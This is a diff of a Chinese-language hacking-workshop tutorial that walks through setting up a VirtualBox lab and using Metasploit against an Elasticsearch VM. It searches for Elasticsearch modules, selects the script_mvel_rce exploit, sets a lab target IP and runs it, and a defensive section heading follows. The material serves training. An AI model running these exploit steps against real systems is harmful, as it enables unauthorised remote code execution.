@@ -1,4 +1,4 @@
-<img width="691" alt="image" src="https://github.com/8wingflying/20231216/assets/19550271/71ea8c89-e637-4f61-ab7a-8973174b7dc0"># 環境設定1:virtualbox安裝與設定
+# 環境設定1:virtualbox安裝與設定
 - 標準安裝virtualbox ==> 下一步下一步就裝好了
 - 使用系統管理員身分啟動cmd
 - 切換到VirtualBox 目錄 ==> cd C:\Program Files\Oracle\VirtualBox
@@ -20,6 +20,7 @@
 - 步驟2:啟動metasploit== > msfconsole
 ![metasploit_1.png](metasploit_1.png)
 - 步驟3:search elastic
+![metasploit_2.png](metasploit_2.png)
 ```
 1  auxiliary/scanner/elasticsearch/indices_enum                       normal     Yes    ElasticSearch Indices Enumeration Utility
 2  auxiliary/scanner/http/elasticsearch_traversal                     normal     Yes    ElasticSearch Snapshot API Directory Traversal
@@ -27,12 +28,16 @@
 4  exploit/multi/elasticsearch/search_groovy_script  2015-02-11       excellent  Yes    ElasticSearch Search Groovy Sandbox Bypass
 5  exploit/multi/misc/xdh_x_exec                     2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution
 ```
-![metasploit_2.png](metasploit_2.png)
-- 步驟4:use exploit/multi/elasticsearch/script_mvel_rce
 
+- 步驟4:use exploit/multi/elasticsearch/script_mvel_rce
 ![metasploit_3.png](metasploit_3.png)
 ![metasploit_4.png](metasploit_4.png)
-
+- 步驟5:設定攻擊參數
+  - show options
+  - set RHOSTS 10.0.2.4
+  - show options
+- 步驟6:進行攻擊 ==> exploit 或者 run
+- 步驟7:攻擊成功
 
 # B.駭客攻防實戰營(2):如何阻擋駭客攻擊?
 ### 你必須要知道的Windows作業系統常用工具
